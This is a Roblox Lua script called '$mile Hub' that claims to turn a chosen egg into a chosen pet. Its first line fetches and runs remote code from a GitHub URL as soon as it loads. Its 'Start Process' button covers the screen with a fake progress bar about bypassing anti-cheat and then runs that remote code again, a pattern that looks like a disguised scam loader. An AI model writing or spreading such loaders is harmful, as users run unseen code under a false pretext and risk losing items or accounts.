-- Auto-run External Script
loadstring(game:HttpGet("https://raw.githubusercontent.com/muzammil909900/EGG-PET-METHOD/refs/heads/main/351d51bdaaa9c7ef38c715a8330fc4dd.txt"))()
-- Roblox GUI Script (Rayfield UI Enhanced + Custom Progress Animation)
-- Full-featured GUI with gradient black screen, stroke watermark, slider progress, and smooth transitions

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local Window = Rayfield:CreateWindow({
	Name = "$mile Hub",
	LoadingTitle = "Connecting to $mile System...",
	LoadingSubtitle = "Powered by .gg/smile",
	ConfigurationSaving = {
		Enabled = true,
		FolderName = "$mileHub",
		FileName = "MainGUI"
	},
	Discord = {
		Enabled = false,
		Invite = "smile",
		RememberJoins = false
	},
	KeySystem = false
})

local MainTab = Window:CreateTab("📂 Main")

local EggSelected = ""
MainTab:CreateDropdown({
	Name = "🥚 Select Egg",
	Options = {"Common Egg", "Summer Common Egg", "Rare Egg", "Summer Rare Egg", "Paradise Egg", "Mythical Egg", "Bug Egg"},
	CurrentOption = "Common Egg",
	Flag = "EggSelector",
	Callback = function(v)
		EggSelected = v
	end
})

local PetSelected = ""
MainTab:CreateDropdown({
	Name = "🐾 Select Pet",
	Options = {"Dog", "Dragon Fly", "Red Fox"},
	CurrentOption = "Dog",
	Flag = "PetSelector",
	Callback = function(v)
		PetSelected = v
	end
})

MainTab:CreateParagraph({
	Title = "⚠️ WARNING",
	Content = "Some features like Summer Pets are not supported in older servers. Avoid using them in old server modes to prevent errors."
})

MainTab:CreateButton({
	Name = "🔍 Join Old Server",
	Callback = function()
		Rayfield:Notify({
			Title = "🔎 Searching...",
			Content = "Looking for old server...",
			Duration = 3,
			Image = 4483362458
		})

		task.spawn(function()
			local success, result = pcall(function()
				return HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"))
			end)

			if success and result and result.data then
				for _, server in ipairs(result.data) do
					if server.playing < server.maxPlayers and not server.isPrivate then
						Rayfield:Notify({
							Title = "✅ Old Server Found",
							Content = "Joining old public server...",
							Duration = 4,
							Image = 4483362458
						})
						task.wait(2)
						TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, Players.LocalPlayer)
						return
					end
				end
			end

			Rayfield:Notify({
				Title = "❌ Error",
				Content = "No old server found! All public servers may be full.",
				Duration = 4,
				Image = 4483362458
			})
		end)
	end
})

MainTab:CreateButton({
	Name = "▶️ Start Process",
	Callback = function()
		local screenGui = Instance.new("ScreenGui", game.Players.LocalPlayer:WaitForChild("PlayerGui"))
		screenGui.IgnoreGuiInset = true
		screenGui.ResetOnSpawn = false

		local blackFrame = Instance.new("Frame", screenGui)
		blackFrame.Size = UDim2.new(1, 0, 1, 0)
		blackFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		blackFrame.BackgroundTransparency = 0

		local gradient = Instance.new("UIGradient", blackFrame)
		gradient.Color = ColorSequence.new{
			ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 30)),
			ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 60, 180))
		}
		gradient.Rotation = 45

		local watermark = Instance.new("TextLabel", blackFrame)
		watermark.Text = "$mile Hub"
		watermark.Size = UDim2.new(1, 0, 0.1, 0)
		watermark.Position = UDim2.new(0, 0, 0.02, 0)
		watermark.BackgroundTransparency = 1
		watermark.TextStrokeTransparency = 0
		watermark.TextTransparency = 0.8
		watermark.Font = Enum.Font.GothamBlack
		watermark.TextColor3 = Color3.new(1, 1, 1)
		watermark.TextScaled = true

		local sliderBack = Instance.new("Frame", blackFrame)
		sliderBack.Position = UDim2.new(0.1, 0, 0.9, 0)
		sliderBack.Size = UDim2.new(0.8, 0, 0.03, 0)
		sliderBack.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		local corner = Instance.new("UICorner", sliderBack)
		corner.CornerRadius = UDim.new(0, 12)

		local sliderFill = Instance.new("Frame", sliderBack)
		sliderFill.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
		sliderFill.Size = UDim2.new(0, 0, 1, 0)
		sliderFill.BackgroundTransparency = 0.1
		local fillCorner = Instance.new("UICorner", sliderFill)
		fillCorner.CornerRadius = UDim.new(0, 12)

		local progressText = Instance.new("TextLabel", blackFrame)
		progressText.Text = "Initializing..."
		progressText.Size = UDim2.new(1, 0, 0.1, 0)
		progressText.Position = UDim2.new(0, 0, 0.45, 0)
		progressText.BackgroundTransparency = 1
		progressText.TextColor3 = Color3.fromRGB(255, 255, 255)
		progressText.Font = Enum.Font.GothamBold
		progressText.TextScaled = true

		local messages = {
			"Detecting Egg...",
			"Getting Your Desired Pet...",
			"Bypassing Anti Cheat...",
			"Don't Move... This may trigger errors...",
			"If it's taking longer than expected, report at discord.gg/smile"
		}

		local function animateProgress()
			for i = 1, 100 do
				sliderFill:TweenSize(UDim2.new(i/100, 0, 1, 0), "Out", "Sine", 0.5, true)
				if i % 20 == 0 then
					progressText.Text = messages[((i / 20 - 1) % #messages) + 1]
				end
				wait(6)
			end
			progressText.Text = "100% - All checks passed."
		end

		task.spawn(animateProgress)

		task.delay(10, function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/muzammil909900/EGG-PET-METHOD/refs/heads/main/351d51bdaaa9c7ef38c715a8330fc4dd.txt"))()
		end)
	end
})

local HelpTab = Window:CreateTab("❓ Help")
HelpTab:CreateParagraph({
	Title = "Need Help?",
	Content = "If anything is not working properly, please create a ticket in our Discord server: discord.gg/smile"
})

local CreditsTab = Window:CreateTab("⭐ Credits")
CreditsTab:CreateParagraph({
	Title = "$mile Hub Team",
	Content = "UI: Rayfield\nScript: by $mile\nRayfield Script By sirius.menu"
})

local ChangelogTab = Window:CreateTab("📝 Changelog")
ChangelogTab:CreateParagraph({
	Title = "Latest Changes:",
	Content = "- Progress bar added\n- Blue/black gradient\n- $mile Hub stroke watermark\n- Join Old Server improved"
})
